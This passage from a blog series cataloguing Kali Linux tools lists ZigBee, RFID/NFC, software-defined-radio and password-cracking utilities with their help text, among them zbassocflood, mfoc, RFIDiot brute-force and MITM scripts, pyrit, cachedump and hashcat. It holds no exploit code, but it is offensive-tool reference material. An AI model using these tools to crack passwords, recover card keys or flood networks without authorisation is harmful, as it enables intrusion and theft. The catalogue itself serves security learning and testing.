<p>Usage: zbassocflood [-pcDis] [-i devnumstring] [-p PANID] [-c channel]</p>

<pre><code>                    [-s per-packet delay/float]
</code></pre>

<p>e.x. zbassocflood -p 0xBAAD -c 11 -s 0.1
```</p>

<p><strong>zbdsniff</strong></p>

<p>Decode plaintext key ZigBee delivery from a capture file.  Will
process libpcap or Daintree SNA capture files.</p>

<p>``` plain
zbdsniff: Decode plaintext key ZigBee delivery from a capture file.  Will
process libpcap or Daintree SNA capture files.    <a href="&#109;&#97;&#x69;&#108;&#116;&#x6f;&#58;&#x6a;&#119;&#114;&#x69;&#103;&#x68;&#116;&#64;&#x77;&#105;&#x6c;&#x6c;&#x68;&#x61;&#x63;&#107;&#x66;&#111;&#114;&#115;&#x75;&#x73;&#x68;&#x69;&#46;&#99;&#111;&#109;">&#106;&#x77;&#x72;&#x69;&#x67;&#x68;&#116;&#x40;&#119;&#x69;&#x6c;&#x6c;&#x68;&#97;&#99;&#107;&#x66;&#111;&#114;&#115;&#117;&#x73;&#104;&#x69;&#46;&#99;&#111;&#109;</a></p>

<p>Usage: zbdsniff [capturefiles &hellip;]
```</p>

<p><strong>zbdump</strong></p>

<p>A tcpdump-like tool for ZigBee/IEEE 802.15.4 networks</p>

<p>``` plain
zbdump &ndash; a tcpdump-like tool for ZigBee/IEEE 802.15.4 networks
Compatible with Wireshark 1.1.2 and later &ndash; <a href="&#109;&#97;&#x69;&#108;&#116;&#111;&#x3a;&#x6a;&#x77;&#114;&#x69;&#x67;&#x68;&#116;&#x40;&#119;&#x69;&#x6c;&#x6c;&#104;&#x61;&#x63;&#x6b;&#x66;&#111;&#x72;&#115;&#x75;&#x73;&#104;&#x69;&#x2e;&#x63;&#111;&#x6d;">&#x6a;&#119;&#x72;&#105;&#x67;&#x68;&#x74;&#x40;&#119;&#105;&#108;&#108;&#x68;&#x61;&#x63;&#x6b;&#x66;&#x6f;&#114;&#115;&#x75;&#115;&#x68;&#105;&#x2e;&#x63;&#111;&#x6d;</a></p>

<p>Usage: zbdump [-fiwDch] [-f channel] [-w pcapfile] [-W daintreefile]</p>

<pre><code>     [-i devnumstring]
</code></pre>

<p>```</p>

<p><strong>zbfind</strong></p>

<p>zbfind provides a GTK-based GUI to the user which displays the results of a zbstumbler-like functionality. zbfind sends beacon requests as it cycles through channels and listens for a response, adding the response to a table as well as displaying signal strength on a gauge widget.</p>

<p><img class="center" src="/images/kali/wifi/zbfind.png" title="&lsquo;zbfind&rsquo; &lsquo;zbfind&rsquo;" ></p>

<p><strong>zbgoodfind</strong></p>

<p>Search a binary file to identify the encryption key for a given
SNA or libpcap IEEE 802.15.4 encrypted packet</p>

<p>``` plain
zbgoodfind &ndash; search a binary file to identify the encryption key for a given
SNA or libpcap IEEE 802.15.4 encrypted packet &ndash; <a href="&#109;&#97;&#105;&#x6c;&#x74;&#x6f;&#58;&#106;&#119;&#x72;&#x69;&#103;&#x68;&#x74;&#x40;&#119;&#x69;&#108;&#108;&#104;&#x61;&#99;&#107;&#x66;&#111;&#x72;&#x73;&#117;&#x73;&#x68;&#x69;&#x2e;&#99;&#x6f;&#x6d;">&#x6a;&#x77;&#x72;&#x69;&#x67;&#104;&#x74;&#64;&#119;&#105;&#x6c;&#108;&#x68;&#x61;&#99;&#x6b;&#x66;&#x6f;&#114;&#115;&#x75;&#x73;&#x68;&#x69;&#46;&#x63;&#111;&#109;</a></p>

<p>Usage: zbgoodfind [-frRFd] [-f binary file] [-r pcapfile] [-R daintreefile]</p>

<pre><code>     [-F Don't skip 2-byte FCS at end of each frame]
     [-d genenerate binary file (test mode)]
</code></pre>

<p>```</p>

<p><strong>zbreplay</strong></p>

<p>Replay ZigBee/802.15.4 network traffic from libpcap or Daintree files</p>

<p>``` plain
zbreplay: replay ZigBee/802.15.4 network traffic from libpcap or Daintree files
<a href="&#x6d;&#97;&#x69;&#108;&#x74;&#111;&#x3a;&#106;&#119;&#114;&#105;&#103;&#x68;&#x74;&#x40;&#119;&#x69;&#x6c;&#108;&#104;&#97;&#99;&#107;&#102;&#x6f;&#x72;&#x73;&#117;&#115;&#104;&#105;&#x2e;&#99;&#x6f;&#x6d;">&#x6a;&#x77;&#x72;&#x69;&#x67;&#x68;&#116;&#64;&#119;&#x69;&#x6c;&#x6c;&#104;&#97;&#x63;&#107;&#x66;&#x6f;&#114;&#x73;&#117;&#115;&#104;&#105;&#46;&#99;&#111;&#109;</a></p>

<p>Usage: zbreplay [-rRfiDch] [-f channel] [-r pcapfile] [-R daintreefile]</p>

<pre><code>     [-i devnumstring] [-s delay/float] [-c countpackets]
</code></pre>

<p>```</p>

<p><strong>zbstumbler</strong></p>

<p>Transmit beacon request frames to the broadcast address while
channel hopping to identify ZC/ZR devices.</p>

<p>``` plain
zbstumbler: Transmit beacon request frames to the broadcast address while
channel hopping to identify ZC/ZR devices.  <a href="&#109;&#x61;&#x69;&#x6c;&#116;&#111;&#x3a;&#106;&#119;&#x72;&#105;&#103;&#104;&#x74;&#x40;&#x77;&#x69;&#108;&#x6c;&#104;&#x61;&#99;&#x6b;&#102;&#111;&#114;&#115;&#117;&#115;&#x68;&#105;&#x2e;&#99;&#111;&#109;">&#x6a;&#119;&#x72;&#x69;&#103;&#104;&#x74;&#x40;&#x77;&#105;&#108;&#108;&#x68;&#x61;&#x63;&#107;&#102;&#x6f;&#x72;&#115;&#x75;&#x73;&#x68;&#105;&#46;&#99;&#111;&#x6d;</a></p>

<p>Usage: zbstumbler [-iscwD] [-i devnumstring] [-s per-channel delay] [-c channel]</p>

<pre><code>                      [-w report.csv]
</code></pre>

<p>```</p>

<h3>RFID / NFC Tools</h3>

<h3>NFC Tools</h3>

<p><strong>mfcuk</strong></p>

<p>Toolkit containing samples and various tools based on and around libnfc and crapto1, with emphasis on Mifare Classic NXP/Philips RFID cards. Special emphasis of the toolkit is on the following:</p>

<ul>
<li><p>mifare classic weakness demonstration/exploitation</p></li>
<li><p>demonstrate use of libnfc (and ACR122 readers)</p></li>
<li><p>demonstrate use of Crapto1 implementation to confirm internal workings and to verify theoretical/practical weaknesses/attacks</p></li>
</ul>


<p><strong>mfoc</strong></p>

<p>MFOC is an open source implementation of “offline nested” attack by Nethemba.
This program allow to recover authentication keys from MIFARE Classic card.
Please note MFOC is able to recover keys from target only if it have a known key: default one (hardcoded in MFOC) or custom one (user provided using command line).</p>

<p><strong>mfterm</strong></p>

<p>A terminal interface for working with Mifare tags.</p>

<p>The  program  is  used as an interactive shell to read and write Mifare
tags using libnfc and a libnfc compatible reader or to  simply  manipulate Mifare data dumps from files.</p>

<p>``` plain
A terminal interface for working with Mifare Classic tags.
Usage: mfterm [-v] [-h] [-k keyfile]</p>

<p>Options:
  &mdash;help          (-h)   Show this help message.
  &mdash;version       (-v)   Display version information.
  &mdash;tag=tagfile   (-t)   Load a tag from the specified file.
  &mdash;keys=keyfile  (-k)   Load keys from the specified file.
  &mdash;dict=dictfile (-d)   Load dictionary from the specified file.</p>

<p>Report bugs to: <a href="&#109;&#97;&#x69;&#x6c;&#x74;&#x6f;&#58;&#x61;&#x6e;&#x64;&#101;&#114;&#x73;&#x40;&#52;&#x7a;&#109;&#46;&#x6f;&#114;&#x67;">&#97;&#x6e;&#x64;&#101;&#114;&#x73;&#64;&#52;&#x7a;&#x6d;&#46;&#111;&#114;&#103;</a>
mfterm home page: <a href="https://github.com/4zm/mfterm">https://github.com/4zm/mfterm</a>
```</p>

<p><strong>mifare-classic-format</strong></p>

<p>``` plain
usage: mifare-classic-format [-fy] [keyfile]</p>

<p>Options:
  -f      Fast format (only erase MAD)
  -y      Do not ask for confirmation (dangerous)
  keyfile Use keys from dump in addition to internal default keys
```</p>

<p><strong>nfc-list</strong></p>

<p>nfc-list  is  a utility for listing any available tags like ISO14443-A,
FeliCa, Jewel or ISO14443-B (according to the device capabilities).  It
may  detect several tags at once thanks to a mechanism called anti-collision but all types of tags don&rsquo;t support anti-collision and there  is
some physical limitation of the number of tags the reader can discover.</p>

<p>This tool displays all available information at selection time.</p>

<p><code>plain
nfc-list uses libnfc 1.7.0
usage: nfc-list [-v]
  -v     verbose display
</code></p>

<p><strong>nfc-mfclassic</strong></p>

<p>nfc-mfclassic is a MIFARE Classic tool that allow to read or write DUMP
file using MIFARE keys provided in KEYS file.</p>

<p>``` plain
Usage: nfc-mfclassic r|R|w|W a|b &lt;dump.mfd> [&lt;keys.mfd> [f]]
  r|R|w|W       &ndash; Perform read from &reg; or unlocked read from &reg; or write to (w) or unlocked write to (W) card</p>

<pre><code>              *** note that unlocked write will attempt to overwrite block 0 including UID
              *** unlocked read does not require authentication and will reveal A and B keys
              *** unlocking only works with special Mifare 1K cards (Chinese clones)
</code></pre>

<p>  a|A|b|B       &ndash; Use A or B keys for action; Halt on errors (a|b) or tolerate errors (A|B)
  &lt;dump.mfd>    &ndash; MiFare Dump (MFD) used to write (card to MFD) or (MFD to card)
  &lt;keys.mfd>    &ndash; MiFare Dump (MFD) that contain the keys (optional)
  f             &ndash; Force using the keyfile even if UID does not match (optional)
```</p>

<h3>RFIDiot ACG</h3>

<h3>RFIDiot FROSCH</h3>

<h3>RFIDiot PCSC</h3>

<p>A collection of tools and libraries for exploring RFID technology, written
in Python.</p>

<p><strong>ChAP.py</strong></p>

<p>Script that tries to select the EMV Payment Systems Directory on all inserted cards.</p>

<p><strong>bruteforce.py</strong></p>

<p>Try random numbers to login to sector 0</p>

<p><strong>cardselect.py</strong></p>

<p>Select card and display ID</p>

<p><strong>copytag.py</strong></p>

<p>Read all sectors from a standard tag and write them back to a blank</p>

<p><strong>demotag.py</strong></p>

<p>Test IAIK TUG DemoTag</p>

<p><strong>eeprom.py</strong></p>

<p>Display reader&rsquo;s eeprom settings</p>

<p><strong>fdxbnum.py</strong></p>

<p>Generate / decode FDX-B EM4x05 compliant IDs</p>

<p><strong>formatmifare1kvalue.py</strong></p>

<p>Format value blocks on a mifare standard tag</p>

<p><strong>froschtest.py</strong></p>

<p>Test frosch HTRM112 reader</p>

<p><strong>hidprox.py</strong></p>

<p>Show HID Prox card type and site/id code</p>

<p><strong>hitag2brute.py</strong></p>

<p>Brute Force hitag2 password</p>

<p><strong>hitag2reset.py</strong></p>

<p>Reset hitag2 password</p>

<p><strong>isotype.py</strong></p>

<p>Determine ISO tag type</p>

<p><strong>jcopmifare.py</strong></p>

<p>Test program for mifare emulation on JCOP</p>

<p><strong>jcopsetatrhist.py</strong></p>

<p>Set ATR History bytes on JCOP cards</p>

<p><strong>jcoptool.py</strong></p>

<p>JCOP card toolkit</p>

<p><strong>lfxtype.py</strong></p>

<p>Select card and display tag type</p>

<p><strong>loginall.py</strong></p>

<p>Attempt to login to each sector with transport keys</p>

<p><strong>mifarekeys.py</strong></p>

<p>Calculate 3DES key for Mifare access on JCOP cards</p>

<p><strong>mrpkey.py</strong></p>

<p>Calculate 3DES key for Machine Readable Passport</p>

<p><strong>multiselect.py</strong></p>

<p>Continuously select card and display ID</p>

<p><strong>nfcid.py</strong></p>

<p>Python code for Identifying NFC cards</p>

<p><strong>pn532emulate.py</strong></p>

<p>Switch NXP PN532 reader chip into TAG emulation mode</p>

<p><strong>pn532mitm.py</strong></p>

<p>NXP PN532 Man-In-The_Middle &ndash; log conversations between TAG and external reader</p>

<p><strong>q5reset.py</strong></p>

<p>Reset q5 tag</p>

<p><strong>readlfx.py</strong></p>

<p>Read all sectors from a LFX reader</p>

<p><strong>readmifare1k.py</strong></p>

<p>Read all sectors from a mifare standard tag</p>

<p><strong>readmifaresimple.py</strong></p>

<p>Read all sectors from a mifare tag</p>

<p><strong>readmifareultra.py</strong></p>

<p>Read all sectors from a Ultralight tag</p>

<p><strong>readtag.py</strong></p>

<p>Read all sectors from a standard tag</p>

<p><strong>rfidiot-cli.py</strong></p>

<p>CLI for rfidiot</p>

<p><strong>send_apdu.py</strong></p>

<p>Python code for Sending raw APDU commands</p>

<p><strong>sod.py</strong></p>

<p>Try to find X509 data in EF.SOD</p>

<p><strong>transit.py</strong></p>

<p>Generate / decode FDI Matalec Transit 500 and Transit 999 UIDs</p>

<p><strong>unique.py</strong></p>

<p>Generate EM4x02 and/or UNIQUE compliant IDs</p>

<p><strong>writelfx.py</strong></p>

<p>Read and then write all sectors from a LFX reader</p>

<p><strong>writemifare1k.py</strong></p>

<p>Write all blocks on a mifare standard tag</p>

<p>Check <a href="http://rfidiot.org/">http://rfidiot.org/</a> for more information and examples</p>

<h3>Software Defined Radio</h3>

<p><strong>gnuradio-companion</strong></p>

<p>A graphical tool for creating signal flow graphs and generating flow-graph source code.</p>

<p><img class="center" src="/images/kali/wifi/gnuradio.png" title="&lsquo;gnuradio-companion&rsquo; &lsquo;gnuradio&rsquo;" ></p>

<p><strong>gqrx</strong></p>

<p>Gqrx is a software defined radio receiver powered by the GNU Radio SDR framework and the Qt graphical toolkit. Gqrx supports many of the SDR hardware available, including Funcube Dongles, rtl-sdr, HackRF and USRP devices.</p>

<p>Currently it works on Linux and Mac and supports the following devices:. Funcube Dongle Pro and Pro+ RTL2832U-based DVB-T dongles (rtlsdr via USB and TCP) OsmoSDR USRP HackRF Jawbreaker Nuand bladeRF any other device supported by the gr-osmosdr library</p>

<p>The latest stable version of Gqrx is 2.2, it is available for Linux, FreeBSD and Mac and it offers the following features:</p>

<ul>
<li><p>Discover devices attached to the computer.</p></li>
<li><p>Process I/Q data from the supported devices.</p></li>
<li><p>Change frequency, gain and apply various corrections (frequency, I/Q balance).</p></li>
<li><p>AM, SSB, FM-N and FM-W (mono and stereo) demodulators.</p></li>
<li><p>Special FM mode for NOAA APT.</p></li>
<li><p>Variable band pass filter.</p></li>
<li><p>AGC, squelch and noise blankers.</p></li>
<li><p>FFT plot and waterfall.</p></li>
<li><p>Record and playback audio to / from WAV file.</p></li>
<li><p>Spectrum analyzer mode where all signal processing is disabled.</p></li>
</ul>


<p><img class="center" src="/images/kali/wifi/gqrx.png" title="&lsquo;gqrx&rsquo; &lsquo;gqrx&rsquo;" ></p>

<p><strong>gr-scan</strong></p>

<p>gr-scan is a program written in C++, and built upon GNU Radio, rtl-sdr, and the OsmoSDR Source Block. It is intended to scan a range of frequencies and print a list of discovered signals. It should work with any device that works with that block, including Realtek RTL2832U devices. This software was developed using a Compro U620F, which uses an E4000 tuner</p>

<p><img class="center" src="/images/kali/wifi/gr-scan.png" title="&lsquo;gr-scan&rsquo; &lsquo;gr-scan&rsquo;" ></p>

<p><strong>modes_gui</strong></p>

<p>Part of gr-air-modes</p>

<p>gr-air-modes implements a software-defined radio receiver for Mode S
transponder signals, including ADS-B reports from equipped aircraft.</p>

<p><strong>rtl_adsb</strong></p>

<p>A simple ADS-B decoder</p>

<p><img class="center" src="/images/kali/wifi/rtl_adsb.png" title="&lsquo;rtl_adsb&rsquo; &lsquo;rtl_adsb&rsquo;" ></p>

<p><strong>rtl_fm</strong></p>

<p>A simple narrow band FM demodulator for RTL2832 based DVB-T receivers</p>

<p>``` plain
Use:    rtl_fm -f freq [-options] [filename]</p>

<pre><code>-f frequency_to_tune_to [Hz]
 (use multiple -f for scanning, requires squelch)
 (ranges supported, -f 118M:137M:25k)
[-s sample_rate (default: 24k)]
[-d device_index (default: 0)]
[-g tuner_gain (default: automatic)]
[-l squelch_level (default: 0/off)]
[-o oversampling (default: 1, 4 recommended)]
[-p ppm_error (default: 0)]
[-E sets lower edge tuning (default: center)]
[-N enables NBFM mode (default: on)]
[-W enables WBFM mode (default: off)]
 (-N -s 170k -o 4 -A fast -r 32k -l 0 -D)
filename (a '-' dumps samples to stdout)
 (omitting the filename also uses stdout)
</code></pre>

<p>Experimental options:</p>

<pre><code>[-r output_rate (default: same as -s)]
[-t squelch_delay (default: 20)]
 (+values will mute/scan, -values will exit)
[-M enables AM mode (default: off)]
[-L enables LSB mode (default: off)]
[-U enables USB mode (default: off)]
[-R enables raw mode (default: off, 2x16 bit output)]
[-F enables high quality FIR (default: off/square)]
[-D enables de-emphasis (default: off)]
[-C enables DC blocking of output (default: off)]
[-A std/fast/lut choose atan math (default: std)]
</code></pre>

<p>Produces signed 16 bit ints, use Sox or aplay to hear them.</p>

<pre><code>rtl_fm ... - | play -t raw -r 24k -e signed-integer -b 16 -c 1 -V1 -
             | aplay -r 24k -f S16_LE -t raw -c 1
  -s 22.5k - | multimon -t raw /dev/stdin
</code></pre>

<p>```</p>

<p><strong>rtl_sdr</strong></p>

<p>An I/Q recorder for RTL2832 based DVB-T receivers</p>

<p>``` plain
Usage:   -f frequency_to_tune_to [Hz]</p>

<pre><code>[-s samplerate (default: 2048000 Hz)]
[-d device_index (default: 0)]
[-g gain (default: 0 for auto)]
[-b output_block_size (default: 16 * 16384)]
[-n number of samples to read (default: 0, infinite)]
[-S force sync output (default: async)]
filename (a '-' dumps samples to stdout)
</code></pre>

<p>```</p>

<p><strong>rtlsdr-scanner</strong></p>

<p>A cross platform Python frequency scanning GUI for USB TV dongles, using the OsmoSDR rtl-sdr library.
In other words a cheap, simple Spectrum Analyser.
The scanner attempts to overcome the tuner’s frequency response by averaging scans from both the positive and negative frequency offets of the baseband data.</p>

<p><img class="center" src="/images/kali/wifi/rtlsdr-scanner.png" title="&lsquo;rtlsdr-scanner&rsquo; &lsquo;rtlsdr-scanner&rsquo;" ></p>

<p><strong>rtl_tcp</strong></p>

<p>An I/Q spectrum server for RTL2832 based DVB-T receivers</p>

<p>``` plain
Usage:  [-a listen address]</p>

<pre><code>[-p listen port (default: 1234)]
[-f frequency to tune to [Hz]]
[-g gain (default: 0 for auto)]
[-s samplerate in Hz (default: 2048000 Hz)]
[-b number of buffers (default: 32, set by library)]
[-n max number of linked list buffers to keep (default: 500)]
[-d device index (default: 0)]
</code></pre>

<p>```</p>

<p><strong>rtl_test</strong></p>

<p>A benchmark tool for RTL2832 based DVB-T receivers</p>

<p>``` plain
Usage:</p>

<pre><code>[-s samplerate (default: 2048000 Hz)]
[-d device_index (default: 0)]
[-t enable Elonics E4000 tuner benchmark]
[-p enable PPM error measurement]
[-b output_block_size (default: 16 * 16384)]
[-S force sync output (default: async)]
</code></pre>

<p>```</p>

<blockquote><p>Noise proves nothing.  Often a hen who has merely laid an egg cackles
as if she laid an asteroid.</p>

<p>&mdash; Mark Twain</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Kali tools catalog - Password Attacks]]></title>
    <link href="http://chousensha.github.io/blog/2015/04/04/kali-tools-catalog-password-attacks/"/>
    <updated>2015-04-04T11:08:57-04:00</updated>
    <id>http://chousensha.github.io/blog/2015/04/04/kali-tools-catalog-password-attacks</id>
    <content type="html"><![CDATA[<p>Tools for password related attacks</p>

<!-- more -->


<h3>GPU Tools</h3>

<p><strong>oclhashcat</strong></p>

<p>``` plain</p>

<pre><code>Worlds fastest password cracker
Worlds first and only GPGPU based rule engine
Free
Multi-GPU (up to 128 gpus)
Multi-Hash (up to 100 million hashes)
Multi-OS (Linux &amp; Windows native binaries)
Multi-Platform (OpenCL &amp; CUDA support)
Multi-Algo (see below)
Low resource utilization, you can still watch movies or play games while cracking
Focuses highly iterated modern hashes
Focuses dictionary based attacks
Supports distributed cracking
Supports pause / resume while cracking
Supports sessions
Supports restore
Supports reading words from file
Supports reading words from stdin
Supports hex-salt
Supports hex-charset
Built-in benchmarking system
Integrated thermal watchdog
150+ Algorithms implemented with performance in mind
... and much more
</code></pre>

<p>```</p>

<p>Screenshot from the official <a href="http://hashcat.net/oclhashcat/">site</a> showing it in action:</p>

<p><img class="center" src="/images/kali/password/oclhashcat.png" title="&lsquo;oclhashcat&rsquo; &lsquo;oclhashcat&rsquo;" ></p>

<p><strong>pyrit</strong></p>

<p>Pyrit  exploits  the  computational power of many-core- and GPGPU-platforms  to  create  massive  databases,  pre-computing   part   of   the WPA/WPA2-PSK  authentication  phase  in  a space-time tradeoff. It is a
powerful attack against one of the world&rsquo;s  most  used  security protocols.</p>

<p>``` plain
Pyrit 0.4.0 &copy; 2008-2011 Lukas Lueg <a href="http://pyrit.googlecode.com">http://pyrit.googlecode.com</a>
This code is distributed under the GNU General Public License v3+</p>

<p>Usage: pyrit [options] command</p>

<p>Recognized options:
  -b               : Filters AccessPoint by BSSID
  -e               : Filters AccessPoint by ESSID
  -h               : Print help for a certain command
  -i               : Filename for input (&lsquo;&ndash;&rsquo; is stdin)
  -o               : Filename for output (&lsquo;&ndash;&rsquo; is stdout)
  -r               : Packet capture source in pcap-format
  -u               : URL of the storage-system to use
  &mdash;all-handshakes : Use all handshakes instead of the best one</p>

<p>Recognized commands:
  analyze                 : Analyze a packet-capture file
  attack_batch            : Attack a handshake with PMKs/passwords from the db
  attack_cowpatty         : Attack a handshake with PMKs from a cowpatty-file
  attack_db               : Attack a handshake with PMKs from the db
  attack_passthrough      : Attack a handshake with passwords from a file
  batch                   : Batchprocess the database
  benchmark               : Determine performance of available cores
  benchmark_long          : Longer and more accurate version of benchmark (~10 minutes)
  check_db                : Check the database for errors
  create_essid            : Create a new ESSID
  delete_essid            : Delete a ESSID from the database
  eval                    : Count the available passwords and matching results
  export_cowpatty         : Export results to a new cowpatty file
  export_hashdb           : Export results to an airolib database
  export_passwords        : Export passwords to a file
  help                    : Print general help
  import_passwords        : Import passwords from a file-like source
  import_unique_passwords : Import unique passwords from a file-like source
  list_cores              : List available cores
  list_essids             : List all ESSIDs but don&rsquo;t count matching results
  passthrough             : Compute PMKs and write results to a file
  relay                   : Relay a storage-url via RPC
  selftest                : Test hardware to ensure it computes correct results
  serve                   : Serve local hardware to other Pyrit clients
  strip                   : Strip packet-capture files to the relevant packets
  stripLive               : Capture relevant packets from a live capture-source
  verify                  : Verify 10% of the results by recomputation
```</p>

<h3>Offline Attacks</h3>

<p><strong>cachedump</strong></p>

<p>Recover Windows password cache entries</p>

<p><code>plain
usage: /usr/bin/cachedump &lt;system hive&gt; &lt;security hive&gt;
</code></p>

<p><strong>chntpw</strong></p>

<p>chntpw is a utility to view some information and change user passwords in a Windows NT/2000 SAM  userdatabase  file,  usually  located  at
\WINDOWS\system32\config\SAM on the Windows file system. It is not necessary to know the old passwords to reset them.  In addition it contains a simple registry editor (same size data writes) and hex-editor with which the information contained  in  a  registry  file  can  be
browsed and modified.</p>

<p><img class="center" src="/images/kali/password/chntpw.png" title="&lsquo;chntpw&rsquo; &lsquo;chntpw&rsquo;" ></p>

<p><strong>cmospwd</strong></p>

<p>A cmos/bios password recovery tool</p>

<p><img class="center" src="/images/kali/password/cmospwd.png" title="&lsquo;cmospwd&rsquo; &lsquo;cmospwd&rsquo;" ></p>

<p><strong>crunch</strong></p>

<p>Generate wordlists from a character set</p>

<p>``` plain
crunch version 3.6</p>

<p>Crunch can create a wordlist based on criteria you specify.  The outout from crunch can be sent to the screen, file, or to another program.</p>

<p>Usage: crunch <min> <max> [options]
where min and max are numbers</p>

<p>Please refer to the man page for instructions and examples on how to use crunch.
```</p>

<p><strong>dictstat</strong></p>

<p>Generate dictionary file statistics</p>

<p><img class="center" src="/images/kali/password/dictstat.png" title="&lsquo;dictstat&rsquo; &lsquo;dictstat&rsquo;" ></p>

<p><strong>fcrackzip</strong></p>

<p>Searches each zipfile given for encrypted files and tries  to
guess the password. All files must be encrypted with the same password,
the more files you provide, the better.</p>

<p><img class="center" src="/images/kali/password/fcrackzip.png" title="&lsquo;fcrackzip&rsquo; &lsquo;fcrackzip&rsquo;" ></p>

<p><strong>hashcat</strong></p>

<p>Advanced password recovery</p>

<p>``` plain
root@kali:~# hashcat &mdash;help
hashcat, advanced password recovery</p>

<p>Usage: hashcat [options] hashfile [mask|wordfiles|directories]</p>

<p>=======</p>

<h1>Options</h1>

<ul>
<li><p>General:</p>

<p>-m,  &mdash;hash-type=NUM               Hash-type, see references below
-a,  &mdash;attack-mode=NUM             Attack-mode, see references below
-V,  &mdash;version                     Print version
-h,  &mdash;help                        Print help
     &mdash;eula                        Print EULA
     &mdash;expire                      Print expiration date
     &mdash;quiet                       Suppress output</p></li>
<li><p>Benchmark:</p>

<p>-b,  &mdash;benchmark                   Run benchmark</p></li>
<li><p>Misc:</p>

<pre><code> --hex-salt                    Assume salt is given in hex
 --hex-charset                 Assume charset is given in hex
 --runtime=NUM                 Abort session after NUM seconds of runtime
</code></pre></li>
<li><p>Files:</p>

<p>-o,  &mdash;outfile=FILE                Define outfile for recovered hash
     &mdash;outfile-format=NUM          Define outfile-format for recovered hash, see references below
     &mdash;outfile-autohex-disable     Disable the use of $HEX[] in output plains
-p,  &mdash;separator=CHAR              Define separator char for hashlists/outfile
     &mdash;show                        Show cracked passwords only (see &mdash;username)
     &mdash;left                        Show uncracked passwords only (see &mdash;username)
     &mdash;username                    Enable ignoring of usernames in hashfile (Recommended: also use &mdash;show)
     &mdash;remove                      Enable remove of hash once it is cracked
     &mdash;stdout                      Stdout mode
     &mdash;potfile-disable             Do not write potfile
     &mdash;debug-mode=NUM              Defines the debug mode (hybrid only by using rules), see references below
     &mdash;debug-file=FILE             Output file for debugging rules (see &mdash;debug-mode)
-e,  &mdash;salt-file=FILE              Salts-file for unsalted hashlists</p></li>
<li><p>Resources:</p>

<p>-c,  &mdash;segment-size=NUM            Size in MB to cache from the wordfile
-n,  &mdash;threads=NUM                 Number of threads
-s,  &mdash;words-skip=NUM              Skip number of words (for resume)
-l,  &mdash;words-limit=NUM             Limit number of words (for distributed)</p></li>
<li><p>Rules:</p>

<p>-r,  &mdash;rules-file=FILE             Rules-file use: -r 1.rule
-g,  &mdash;generate-rules=NUM          Generate NUM random rules
     &mdash;generate-rules-func-min=NUM Force NUM functions per random rule min
     &mdash;generate-rules-func-max=NUM Force NUM functions per random rule max
     &mdash;generate-rules-seed=NUM     Force RNG seed to NUM</p></li>
<li><p>Custom charsets:</p>

<p>-1,  &mdash;custom-charset1=CS          User-defined charsets
-2,  &mdash;custom-charset2=CS          Example:
-3,  &mdash;custom-charset3=CS          &mdash;custom-charset1=?dabcdef : sets charset ?1 to 0123456789abcdef
-4,  &mdash;custom-charset4=CS          -2 mycharset.hcchr : sets charset ?2 to chars contained in file</p></li>
<li><p>Toggle-Case attack-mode specific:</p>

<pre><code> --toggle-min=NUM              Number of alphas in dictionary minimum
 --toggle-max=NUM              Number of alphas in dictionary maximum
</code></pre></li>
<li><p>Mask-attack attack-mode specific:</p>

<pre><code> --pw-min=NUM                  Password-length minimum
 --pw-max=NUM                  Password-length maximum
</code></pre></li>
<li><p>Permutation attack-mode specific:</p>

<pre><code> --perm-min=NUM                Filter words shorter than NUM
 --perm-max=NUM                Filter words larger than NUM
</code></pre></li>
<li><p>Table-Lookup attack-mode specific:</p>

<p>-t,  &mdash;table-file=FILE             Table file
     &mdash;table-min=NUM               Number of chars in dictionary minimum
     &mdash;table-max=NUM               Number of chars in dictionary maximum</p></li>
<li><p>Prince attack-mode specific:</p>

<pre><code> --pw-min=NUM                  Password-length minimum
 --pw-max=NUM                  Password-length maximum
 --elem-cnt-min=NUM            Minimum number of elements per chain
 --elem-cnt-max=NUM            Maximum number of elements per chain
</code></pre></li>
</ul>


<p>==========</p>

<h1>References</h1>

<ul>
<li><p>Outfile formats:</p>

<p>  1 = hash[:salt]
  2 = plain
  3 = hash[:salt]:plain
  4 = hex_plain
  5 = hash[:salt]:hex_plain
  6 = plain:hex_plain
  7 = hash[:salt]:plain:hex_plain
  8 = crackpos
  9 = hash[:salt]:crackpos
 10 = plain:crackpos
 11 = hash[:salt]:plain:crackpos
 12 = hex_plain:crackpos
 13 = hash[:salt]:hex_plain:crackpos
 14 = plain:hex_plain:crackpos
 15 = hash[:salt]:plain:hex_plain:crackpos</p></li>
<li><p>Debug mode output formats (for hybrid mode only, by using rules):</p>

<p>  1 = save finding rule
  2 = save original word
  3 = save original word and finding rule
  4 = save original word, finding rule and modified plain</p></li>
<li><p>Built-in charsets:</p>

<p> ?l = abcdefghijklmnopqrstuvwxyz
 ?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ
 ?d = 0123456789
 ?s =  !&ldquo;#$%&amp;&lsquo;()*+,&ndash;./:;&lt;=>?@[]^_`{|}~
 ?a = ?l?u?d?s
 ?b = 0x00 &ndash; 0xff</p></li>
<li><p>Attack modes:</p>

<p>  0 = Straight
  1 = Combination
  2 = Toggle-Case
  3 = Brute-force
  4 = Permutation
  5 = Table-Lookup
  6 = Prince</p></li>
<li><p>Hash types:</p>

<p>   0 = MD5
  10 = md5($pass.$salt)
  20 = md5($salt.$pass)
  30 = md5(unicode($pass).$salt)
  40 = md5($salt.unicode($pass))
  50 = HMAC-MD5 (key = $pass)
  60 = HMAC-MD5 (key = $salt)
 100 = SHA1
 110 = sha1($pass.$salt)
 120 = sha1($salt.$pass)
 130 = sha1(unicode($pass).$salt)
 140 = sha1($salt.unicode($pass))
 150 = HMAC-SHA1 (key = $pass)
 160 = HMAC-SHA1 (key = $salt)
 200 = MySQL323
 300 = MySQL4.1/MySQL5
 400 = phpass, MD5(Wordpress), MD5(phpBB3), MD5(Joomla)
 500 = md5crypt, MD5(Unix), FreeBSD MD5, Cisco-IOS MD5
 900 = MD4
1000 = NTLM
1100 = Domain Cached Credentials, mscash
1400 = SHA256
1410 = sha256($pass.$salt)
1420 = sha256($salt.$pass)
1430 = sha256(unicode($pass).$salt)
1440 = sha256($salt.unicode($pass))
1450 = HMAC-SHA256 (key = $pass)
1460 = HMAC-SHA256 (key = $salt)
1600 = md5apr1, MD5(APR), Apache MD5
1700 = SHA512
1710 = sha512($pass.$salt)
1720 = sha512($salt.$pass)
1730 = sha512(unicode($pass).$salt)
1740 = sha512($salt.unicode($pass))
1750 = HMAC-SHA512 (key = $pass)
1760 = HMAC-SHA512 (key = $salt)
1800 = SHA-512(Unix)
2400 = Cisco-PIX MD5
2410 = Cisco-ASA MD5
2500 = WPA/WPA2
2600 = Double MD5
